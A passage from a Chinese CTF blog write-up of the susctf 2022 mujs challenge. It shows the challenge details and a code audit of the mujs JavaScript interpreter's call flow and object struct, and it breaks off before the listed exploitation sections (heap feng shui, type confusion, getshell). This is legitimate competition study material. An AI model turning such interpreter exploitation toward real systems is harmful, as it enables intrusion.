<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>susctf2022_mujs | Lingze&#39;s blog</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="ctfer">
    <meta name="keywords" content="ctfer">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.415d0a97.css" as="style"><link rel="preload" href="/assets/js/app.01f8cc77.js" as="script"><link rel="preload" href="/assets/js/2.5ece5099.js" as="script"><link rel="preload" href="/assets/js/48.fa3498f4.js" as="script"><link rel="prefetch" href="/assets/js/10.f923d8b8.js"><link rel="prefetch" href="/assets/js/100.cf64d3e9.js"><link rel="prefetch" href="/assets/js/11.19955ff8.js"><link rel="prefetch" href="/assets/js/12.e16d4c4d.js"><link rel="prefetch" href="/assets/js/13.0552f541.js"><link rel="prefetch" href="/assets/js/14.78d67d73.js"><link rel="prefetch" href="/assets/js/15.d342dfc4.js"><link rel="prefetch" href="/assets/js/16.36f247d6.js"><link rel="prefetch" href="/assets/js/17.031ae63f.js"><link rel="prefetch" href="/assets/js/18.7c49a89e.js"><link rel="prefetch" href="/assets/js/19.2d69c943.js"><link rel="prefetch" href="/assets/js/20.e845eb34.js"><link rel="prefetch" href="/assets/js/21.e398898d.js"><link rel="prefetch" href="/assets/js/22.6efd51e5.js"><link rel="prefetch" href="/assets/js/23.21d2b263.js"><link rel="prefetch" href="/assets/js/24.3231fe48.js"><link rel="prefetch" href="/assets/js/25.26e66a19.js"><link rel="prefetch" href="/assets/js/26.ddde99c2.js"><link rel="prefetch" href="/assets/js/27.f8e523dc.js"><link rel="prefetch" href="/assets/js/28.2c1ddb1d.js"><link rel="prefetch" href="/assets/js/29.f15cca3e.js"><link rel="prefetch" href="/assets/js/3.c087139c.js"><link rel="prefetch" href="/assets/js/30.2d433b5b.js"><link rel="prefetch" href="/assets/js/31.87dbaed0.js"><link rel="prefetch" href="/assets/js/32.045dc002.js"><link rel="prefetch" href="/assets/js/33.db01bde8.js"><link rel="prefetch" href="/assets/js/34.d177d280.js"><link rel="prefetch" href="/assets/js/35.360c2104.js"><link rel="prefetch" href="/assets/js/36.afbabc8a.js"><link rel="prefetch" href="/assets/js/37.8e60e299.js"><link rel="prefetch" href="/assets/js/38.c6a43a23.js"><link rel="prefetch" href="/assets/js/39.08102dc6.js"><link rel="prefetch" href="/assets/js/4.28fb810e.js"><link rel="prefetch" href="/assets/js/40.5767c7d7.js"><link rel="prefetch" href="/assets/js/41.307bcf10.js"><link rel="prefetch" href="/assets/js/42.daf03989.js"><link rel="prefetch" href="/assets/js/43.952d68dc.js"><link rel="prefetch" href="/assets/js/44.cbeef42b.js"><link rel="prefetch" href="/assets/js/45.fbd2a9f2.js"><link rel="prefetch" href="/assets/js/46.a92ae456.js"><link rel="prefetch" href="/assets/js/47.24f82953.js"><link rel="prefetch" href="/assets/js/49.a64774f2.js"><link rel="prefetch" href="/assets/js/5.0660e0b3.js"><link rel="prefetch" href="/assets/js/50.d0ed88cd.js"><link rel="prefetch" href="/assets/js/51.50727b96.js"><link rel="prefetch" href="/assets/js/52.2756affe.js"><link rel="prefetch" href="/assets/js/53.2739f473.js"><link rel="prefetch" href="/assets/js/54.f0b71120.js"><link rel="prefetch" href="/assets/js/55.94d5a5ee.js"><link rel="prefetch" href="/assets/js/56.637c3b4a.js"><link rel="prefetch" href="/assets/js/57.7b7e3fee.js"><link rel="prefetch" href="/assets/js/58.812bae5d.js"><link rel="prefetch" href="/assets/js/59.70fe1d63.js"><link rel="prefetch" href="/assets/js/6.c52e1544.js"><link rel="prefetch" href="/assets/js/60.0e6a01d3.js"><link rel="prefetch" href="/assets/js/61.702e5198.js"><link rel="prefetch" href="/assets/js/62.38f55e44.js"><link rel="prefetch" href="/assets/js/63.b505c9de.js"><link rel="prefetch" href="/assets/js/64.5489c9d8.js"><link rel="prefetch" href="/assets/js/65.3db6e034.js"><link rel="prefetch" href="/assets/js/66.3605a461.js"><link rel="prefetch" href="/assets/js/67.00d97ed9.js"><link rel="prefetch" href="/assets/js/68.78ef741a.js"><link rel="prefetch" href="/assets/js/69.808ca1f4.js"><link rel="prefetch" href="/assets/js/7.9920c8ea.js"><link rel="prefetch" href="/assets/js/70.15347f58.js"><link rel="prefetch" href="/assets/js/71.b9acfd65.js"><link rel="prefetch" href="/assets/js/72.7e1140f3.js"><link rel="prefetch" href="/assets/js/73.874f0e99.js"><link rel="prefetch" href="/assets/js/74.117bb7d4.js"><link rel="prefetch" href="/assets/js/75.964e2dfe.js"><link rel="prefetch" href="/assets/js/76.2df26afd.js"><link rel="prefetch" href="/assets/js/77.93ebe7b7.js"><link rel="prefetch" href="/assets/js/78.67c6c9bb.js"><link rel="prefetch" href="/assets/js/79.0d846438.js"><link rel="prefetch" href="/assets/js/8.f3c32733.js"><link rel="prefetch" href="/assets/js/80.4716a5b6.js"><link rel="prefetch" href="/assets/js/81.d8c3b2d2.js"><link rel="prefetch" href="/assets/js/82.ea63e06a.js"><link rel="prefetch" href="/assets/js/83.4d1ef8ae.js"><link rel="prefetch" href="/assets/js/84.32a22fe7.js"><link rel="prefetch" href="/assets/js/85.7fb3f862.js"><link rel="prefetch" href="/assets/js/86.4d386fc9.js"><link rel="prefetch" href="/assets/js/87.a095878a.js"><link rel="prefetch" href="/assets/js/88.69d77356.js"><link rel="prefetch" href="/assets/js/89.21ebadb4.js"><link rel="prefetch" href="/assets/js/9.d8b27656.js"><link rel="prefetch" href="/assets/js/90.d49929b7.js"><link rel="prefetch" href="/assets/js/91.cc956227.js"><link rel="prefetch" href="/assets/js/92.b72e3535.js"><link rel="prefetch" href="/assets/js/93.a76f52a2.js"><link rel="prefetch" href="/assets/js/94.82a77dbd.js"><link rel="prefetch" href="/assets/js/95.b0cec47e.js"><link rel="prefetch" href="/assets/js/96.87307703.js"><link rel="prefetch" href="/assets/js/97.c731aa62.js"><link rel="prefetch" href="/assets/js/98.1e36c988.js"><link rel="prefetch" href="/assets/js/99.914f1e07.js">
    <link rel="stylesheet" href="/assets/css/0.styles.415d0a97.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open no-sidebar have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Lingze's blog" class="logo"> <span class="site-name can-hide">Lingze's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/avatar2.jpg"> <div class="blogger-info"><h3>lingze</h3> <span>bin不是垃圾桶的意思!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/archives/" class="nav-link">timeline</a></div><div class="nav-item"><a href="/about.html" class="nav-link">about</a></div><div class="nav-item"><a href="/friends.html" class="nav-link">friends</a></div><div class="nav-item"><a href="/categories/" class="nav-link">categories</a></div><div class="nav-item"><a href="/tags/" class="nav-link">tags</a></div> <!----></nav>  <!----> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-1baff76c><div class="articleInfo" data-v-1baff76c><ul class="breadcrumbs" data-v-1baff76c><li data-v-1baff76c><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1baff76c></a></li> <li data-v-1baff76c><a href="/categories/?category=ctf_wp" title="分类" data-v-1baff76c>ctf_wp</a></li><li data-v-1baff76c><a href="/categories/?category=xctf" title="分类" data-v-1baff76c>xctf</a></li></ul> <div class="info" data-v-1baff76c><div title="作者" class="author iconfont icon-touxiang" data-v-1baff76c><a href="https://github.com/wlingze" target="_blank" title="作者" class="beLink" data-v-1baff76c>lingze</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1baff76c><a href="javascript:;" data-v-1baff76c>2022-03-03</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">susctf2022_mujs<!----></h1> <!----> <div class="theme-vdoing-content content__default"><h1 id="susctf-2022-mujs"><a href="#susctf-2022-mujs" class="header-anchor">#</a> susctf 2022 mujs</h1> <p></p><div class="table-of-contents"><ul><li><a href="#题目信息">题目信息</a></li><li><a href="#代码审计">代码审计</a><ul><li><a href="#执行流程">执行流程</a></li><li><a href="#数据结构">数据结构</a></li><li><a href="#漏洞">漏洞</a></li></ul></li><li><a href="#利用">利用</a><ul><li><a href="#堆风水">堆风水</a></li><li><a href="#类型混淆">类型混淆</a></li><li><a href="#函数调用">函数调用</a></li><li><a href="#getshell">getshell</a></li></ul></li><li><a href="#exp">exp</a></li></ul></div><p></p> <h2 id="题目信息"><a href="#题目信息" class="header-anchor">#</a> 题目信息</h2> <p><strong>mujs</strong></p> <p>dd0a0972b4428771e6a3887da2210c7c9dd40f9c
nc 124.71.182.21 9999</p> <p>解题人数： 10</p> <p>题目分值： 689</p> <p>链接到远程以后要求输入js代码，也就是我们的exp应该是js程序， 通过这个mujs的漏洞攻击c层， 实现getshell。</p> <h2 id="代码审计"><a href="#代码审计" class="header-anchor">#</a> 代码审计</h2> <p>拿到题目发现给了源码，而且看起来应该是个完整的项目，在github找到<a href="https://github.com/ccxvii/mujs" target="_blank" rel="noopener noreferrer">mujs<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>， 翻找了一下相关cve等，并对照最新的cve和题目文件，发现也修复了，猜测是最新版本的mujs, clone下来，直接diff一下两个文件夹， 发现题目文件多了一个<code>jsdataview.c</code>文件， 并且相应位置都做了修改，</p> <p><code>make debug</code>生成有符号的文件，可以开始调试， 逐渐理解这个js解释器的实现，</p> <h3 id="执行流程"><a href="#执行流程" class="header-anchor">#</a> 执行流程</h3> <p>从main函数开始，配合diff可以看到，注释掉了大部分的内置函数，只留下了个print，</p> <p><img src="https://s2.loli.net/2022/03/03/Z5kysG4TYEzXMJ9.png" alt="image-20220303144859294"></p> <p>后面是如果有文件的话会运行文件，没有文件进入交互状态执行，这里我们直接看有文件运行的情况即可。进入函数<code>js_dofille</code>,</p> <p>函数本身逻辑不复杂， 首先<code>js_loadfile</code>， 然后简单设置了一下栈， 进入<code>js_call</code>函数运行代码。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>
<span class="token keyword">int</span> <span class="token function">js_dofile</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">js_ptry</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">js_report</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;exception stack overflow&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_pop</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">js_try</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">js_report</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token function">js_trystring</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_pop</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">js_loadfile</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_pushundefined</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_call</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_pop</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_endtry</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>然后编译部分应该在<code>js_loadfile</code>里，但是基本不用看，</p> <p><code>js_call</code>函数如下， 从栈中获取<code>obj</code>， 然后这个<code>obj</code>就是要调用的函数，支持三种形式</p> <ul><li><code>JS_CFUNCTION</code>是js代码中的函数的语句</li> <li><code>JS_CSCRIPT</code>是js代码中直接写然后被运行了的语句。</li> <li><code>JS_CCFUNCTION</code>是js代码调用一些c实现的内置函数， 进入c语言层运行。</li></ul> <p>这里还有个<code>jsR_pushtrace</code>函数用来做简单记录。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>
<span class="token keyword">void</span> <span class="token function">js_call</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  js_Object <span class="token operator">*</span>obj<span class="token punctuation">;</span>
  <span class="token keyword">int</span> savebot<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">js_rangeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;number of arguments cannot be negative&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">js_iscallable</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;%s is not callable&quot;</span><span class="token punctuation">,</span> <span class="token function">js_typeof</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  obj <span class="token operator">=</span> <span class="token function">js_toobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  savebot <span class="token operator">=</span> BOT<span class="token punctuation">;</span>
  BOT <span class="token operator">=</span> TOP <span class="token operator">-</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>type <span class="token operator">==</span> JS_CFUNCTION<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">jsR_pushtrace</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>filename<span class="token punctuation">,</span>
                  obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>lightweight<span class="token punctuation">)</span>
      <span class="token function">jsR_calllwfunction</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> n<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      <span class="token function">jsR_callfunction</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> n<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>J<span class="token operator">-&gt;</span>tracetop<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>type <span class="token operator">==</span> JS_CSCRIPT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">jsR_pushtrace</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>filename<span class="token punctuation">,</span>
                  obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token operator">-&gt;</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">jsR_callscript</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> n<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>function<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>f<span class="token punctuation">.</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>J<span class="token operator">-&gt;</span>tracetop<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>type <span class="token operator">==</span> JS_CCFUNCTION<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">jsR_pushtrace</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">&quot;native&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">jsR_callcfunction</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> n<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>length<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>function<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>J<span class="token operator">-&gt;</span>tracetop<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  BOT <span class="token operator">=</span> savebot<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>js层的代码， <code>JS_CFUNCTION</code>和<code>JS_CSCRIPT</code>两个类型， function类型可能要简单设置参数等，但是最后都会进入<code>jsR_run</code>函数，这里就是获取opcode并执行的位置，一个典型的大的<code>while+switch</code>语句。</p> <p>c层的代码，通过<code>jsR_callcfunction</code>函数调用。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">jsR_callcfunction</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> min<span class="token punctuation">,</span> js_CFunction F<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  js_Value v<span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> min<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token function">js_pushundefined</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">F</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">stackidx</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  TOP <span class="token operator">=</span> <span class="token operator">--</span>BOT<span class="token punctuation">;</span> <span class="token comment">/* clear stack */</span>
  <span class="token function">js_pushvalue</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>主要执行流程就是如此，除了main函数内置函数被取出了大部分以外基本没有做修改。</p> <h3 id="数据结构"><a href="#数据结构" class="header-anchor">#</a> 数据结构</h3> <p>js中的数据类型全部都是<code>js_Object</code>结构体，由于每种类型使用的数据不同，而且不会存在同时表示两个类型的情况，这里使用<code>union</code>将不同类型的数据都放在一起了。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>
<span class="token keyword">struct</span> <span class="token class-name">js_Object</span>
<span class="token punctuation">{</span>
	<span class="token keyword">enum</span> <span class="token class-name">js_Class</span> type<span class="token punctuation">;</span>
	<span class="token keyword">int</span> extensible<span class="token punctuation">;</span>
	js_Property <span class="token operator">*</span>properties<span class="token punctuation">;</span>
	<span class="token keyword">int</span> count<span class="token punctuation">;</span> <span class="token comment">/* number of properties, for array sparseness check */</span>
	js_Object <span class="token operator">*</span>prototype<span class="token punctuation">;</span>
	<span class="token keyword">union</span> <span class="token punctuation">{</span>
		<span class="token keyword">int</span> boolean<span class="token punctuation">;</span>
		<span class="token keyword">double</span> number<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">;</span>
			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> s<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
